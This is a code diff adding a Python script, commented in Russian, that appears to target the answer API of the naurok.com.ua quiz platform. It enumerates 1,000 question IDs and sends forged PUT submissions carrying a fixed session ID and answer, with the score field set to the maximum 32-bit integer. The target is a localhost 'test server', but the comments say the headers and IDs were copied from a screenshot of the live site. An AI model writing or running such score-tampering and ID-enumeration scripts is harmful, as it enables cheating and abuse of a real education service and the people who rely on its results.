@@ -4,3 +4,52 @@ https://naurok.com.ua/test/complete/7b009424-f956-4762-a0e0-c018fae24907
 with open("numbers.txt", "w") as file:
     for i in range(1, 10001):
         file.write(f"{i}\n")
+import requests
+import json
+import time
+
+# URL вашего ТЕСТОВОГО сервера (замените на актуальный адрес)
+url = "http://127.0.0.1:8080/api2/test/responses/answer"
+
+# Основные заголовки (Headers) из вашего скриншота. 
+# Не забудьте подставить актуальные Cookie, если ваш тестовый сервер их требует.
+headers = {
+    "Content-Type": "application/json;charset=utf-8",
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
+}
+
+# Неизменная часть ID из вашего скриншота
+base_question_id = "42669"
+
+# Цикл от 0 до 999
+for i in range(1000):
+    # Форматируем число: делаем его всегда трехзначным (000, 001, ..., 010, ..., 999)
+    suffix = f"{i:03d}"
+    current_question_id = f"{base_question_id}{suffix}"
+
+    # Формируем тело запроса (Payload)
+    payload = {
+        "session_id": 664113711,
+        "answer": [
+            "166867130"
+        ],
+        "question_id": current_question_id,
+        "show_answer": 0,
+        "type": "quiz",
+        "point": "2147483647",
+        "homeworkType": False,
+        "homework": False
+    }
+
+    try:
+        # Отправляем PUT запрос
+        response = requests.put(url, headers=headers, data=json.dumps(payload))
+        
+        # Выводим результат в консоль
+        print(f"[+] Отправлен вопрос {current_question_id} | Статус-код: {response.status_code}")
+        
+        # Небольшая пауза, чтобы не положить сервер слишком быстрыми запросами (DDoS нам не нужен)
+        time.sleep(0.1) 
+
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Ошибка сети при отправке {current_question_id}: {e}")
